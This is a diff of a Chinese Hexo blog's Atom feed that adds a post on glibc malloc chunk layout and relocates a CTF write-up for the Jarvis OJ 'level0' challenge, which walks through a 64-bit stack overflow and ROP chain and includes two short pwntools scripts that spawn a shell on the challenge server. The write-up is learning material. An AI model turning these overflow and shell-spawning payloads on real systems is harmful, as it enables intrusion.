@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.zzl14.xyz/"/>
-  <updated>2020-04-06T13:03:03.102Z</updated>
+  <updated>2020-04-07T09:55:56.113Z</updated>
   <id>https://www.zzl14.xyz/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>chunk结构</title>
+    <link href="https://www.zzl14.xyz/2020/04/07/chunk%E7%BB%93%E6%9E%84/"/>
+    <id>https://www.zzl14.xyz/2020/04/07/chunk%E7%BB%93%E6%9E%84/</id>
+    <published>2020-04-07T06:26:52.000Z</published>
+    <updated>2020-04-07T09:55:56.113Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="内存堆块结构"><a href="#内存堆块结构" class="headerlink" title="内存堆块结构"></a>内存堆块结构</h1><blockquote><p>malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。</p><blockquote><p>结构主要部分有</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; &gt; <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">&gt; &gt; &gt; </span><br><span class="line">&gt; &gt; &gt;   INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">&gt; &gt; &gt;   INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">&gt; &gt; &gt; </span><br><span class="line">&gt; &gt; &gt;   <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">&gt; &gt; &gt;   <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">&gt; &gt; &gt; </span><br><span class="line">&gt; &gt; &gt;   <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">&gt; &gt; &gt;   <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">&gt; &gt; &gt;   <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&gt; &gt; &gt; &#125;;</span><br><span class="line">&gt; &gt; &gt;</span><br></pre></td></tr></table></figure></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><ul><li>prev_size仅在前一个堆块（较低地址）是<code>free</code>状态才生效。</li><li>size指的是本chunk的大小即为图中<code>chunk</code>到<code>nextchunk</code>的大小</li><li>fd是指向下一个（非物理相邻）被<code>free</code>的 chunk</li><li>bk 指向上一个（非物理相邻）被<code>free</code>的 chunk</li><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块</li></ul><p>size</p><p>malloc_chunk* fd</p></blockquote></blockquote></blockquote><p><img alt data-src="https://i.loli.net/2020/04/07/Me76wTjuBZtpI8y.jpg" class="lazyload"></p><h2 id="各部分详解"><a href="#各部分详解" class="headerlink" title="各部分详解"></a>各部分详解</h2><ul><li><p><strong>prev_size</strong>只有<code>chunk 被free</code>空闲的时候才使用，如果前一个chunk未被free，前一个chunk可以覆写到presize位，正如图中所示，chunk可以写<strong><em>内容（user data）</em></strong>到下一个堆块的<code>pre_size</code> <strong>这就是 chunk 中的空间复用</strong></p><blockquote><p>这样看起来好像size位才是chunk的开始。？</p><p>但是chunk块的地址从这里开始</p></blockquote></li><li><p><strong>size</strong>记录的大小一般是 <strong>2 * SIZE_SZ</strong> 的最小整数倍。</p><blockquote><p>若<code>malloc(n)</code> 则<code>size</code>=<strong>(n+SIZE_SZ)再补齐</strong>，</p><p>我是看做<code>data</code>部分大小加上<code>size</code>位的大小再补齐</p><p> <strong>SIZE_SZ</strong>= 4（32位系统）或8（64位系统）</p><p>另外size后三位有特殊用途，所以size的真正大小要将后三位取0</p><ul><li><p>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p></li><li><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p></li><li><p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></blockquote></li><li><p><strong>fd，bk</strong></p><blockquote><p>malloc成功时返回的地址就是fd的地址</p><p>chunk 处于分配状态时，从 fd 字段开始是用户的数据,<code>chunk 被free</code>后才发挥作用</p><ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li></ul></blockquote></li><li><p><strong>fd_nextsize， bk_nextsize</strong><code>chunk 被free</code>的时候才使用，用于<code>large chunk</code>。</p><blockquote><ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li></ul></blockquote></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;内存堆块结构&quot;&gt;&lt;a href=&quot;#内存堆块结构&quot; class=&quot;headerlink&quot; title=&quot;内存堆块结构&quot;&gt;&lt;/a&gt;内存堆块结构&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 m
+      
+    
+    </summary>
+    
+    
+      <category term="堆" scheme="https://www.zzl14.xyz/categories/%E5%A0%86/"/>
+    
+    
+      <category term="-chunk结构 -malloc -linux" scheme="https://www.zzl14.xyz/tags/chunk%E7%BB%93%E6%9E%84-malloc-linux/"/>
+    
+  </entry>
   
   <entry>
     <title>hexo Butterfly主题配置及部署到服务器</title>
@@ -273,6 +300,34 @@
   </entry>
   
   <entry>
+    <title>level0</title>
+    <link href="https://www.zzl14.xyz/2019/08/08/level0/"/>
+    <id>https://www.zzl14.xyz/2019/08/08/level0/</id>
+    <published>2019-08-08T07:25:16.000Z</published>
+    <updated>2019-10-30T09:09:59.328Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>1.首先要用到</p><pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p><pre><code>Stack 的作用是防止栈的溢出NX    的作用为防止栈中的可执行代码  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p><pre><code>首先打开文件后可以按空格键，查看地址与汇编指令在功能表里找到main,便于分析程序按tab键会出现伪代码，我们分析这个来找出漏洞shift+F12可以出现字符串表ctrl+F 可以出现查找框想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p><pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址这里要了解一下栈的基本结构以及如何传递内容然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p><p>4.脚本的书写</p><pre><code>1.from pwn import *    (导入pwn里的内容)2.p=remote(&apos;地址&apos;,端口)    （连接服务器并创建一个对象）、3.p.recv()  p.recvline() p.recvuntil()    (都是接受服务器返回的字符串，具体区别不太懂)4.p.send()  p.sendline() p.sendafter()    (都是向服务器传入字符串，具体区别不太懂)5.p.interactive()    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p><pre><code>1.buf距离rbp 0x80，rbp本身占位82.函数返回地址可填callsystem的地址3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p><pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p><pre><code>3.所以构建的payload为    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p><p>一</p><p>`</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)s_addr=0x0000000000400596p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))p.interactive()</code></pre><p><code>二</code></p><pre><code> #coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)rdi=0x400663p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))p.interactive()</code></pre><p>`</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;p&gt;1.首先要用到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;apos;file&amp;apos;  ，来查看用多少位的ida打开。
+&amp;apos;checksec&amp;apos; ，用来查看文件的保护机制&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt dat
+      
+    
+    </summary>
+    
+    
+    
+      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
     <title>python基本数据类型</title>
     <link href="https://www.zzl14.xyz/2019/08/08/python/"/>
     <id>https://www.zzl14.xyz/2019/08/08/python/</id>
@@ -324,34 +379,6 @@
 
 &lt;p&gt;攻防世界 &lt;/p&gt;
 &lt;h1 id=&quot;CGfsb&quot;&gt;&lt;a href=&quot;#CGfsb&quot; class=&quot;headerlink&quot; title=&quot;CGfsb&quot;&gt;&lt;/a&gt;CGfsb&lt;/h1&gt;&lt;p&gt;格式化字符串漏洞&lt;br&gt;因为当时做这个题时候不
-      
-    
-    </summary>
-    
-    
-    
-      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>level0</title>
-    <link href="https://www.zzl14.xyz/2019/08/08/level0/"/>
-    <id>https://www.zzl14.xyz/2019/08/08/level0/</id>
-    <published>2019-08-08T07:25:16.000Z</published>
-    <updated>2019-10-30T09:09:59.328Z</updated>
-    
-    <content type="html"><![CDATA[<a id="more"></a><p>1.首先要用到</p><pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p><pre><code>Stack 的作用是防止栈的溢出NX    的作用为防止栈中的可执行代码  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p><pre><code>首先打开文件后可以按空格键，查看地址与汇编指令在功能表里找到main,便于分析程序按tab键会出现伪代码，我们分析这个来找出漏洞shift+F12可以出现字符串表ctrl+F 可以出现查找框想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p><pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址这里要了解一下栈的基本结构以及如何传递内容然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p><p>4.脚本的书写</p><pre><code>1.from pwn import *    (导入pwn里的内容)2.p=remote(&apos;地址&apos;,端口)    （连接服务器并创建一个对象）、3.p.recv()  p.recvline() p.recvuntil()    (都是接受服务器返回的字符串，具体区别不太懂)4.p.send()  p.sendline() p.sendafter()    (都是向服务器传入字符串，具体区别不太懂)5.p.interactive()    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p><pre><code>1.buf距离rbp 0x80，rbp本身占位82.函数返回地址可填callsystem的地址3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p><pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p><pre><code>3.所以构建的payload为    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p><p>一</p><p>`</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)s_addr=0x0000000000400596p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))p.interactive()</code></pre><p><code>二</code></p><pre><code> #coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)rdi=0x400663p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))p.interactive()</code></pre><p>`</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-
-&lt;p&gt;1.首先要用到&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;apos;file&amp;apos;  ，来查看用多少位的ida打开。
-&amp;apos;checksec&amp;apos; ，用来查看文件的保护机制&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt dat
       
     
     </summary>
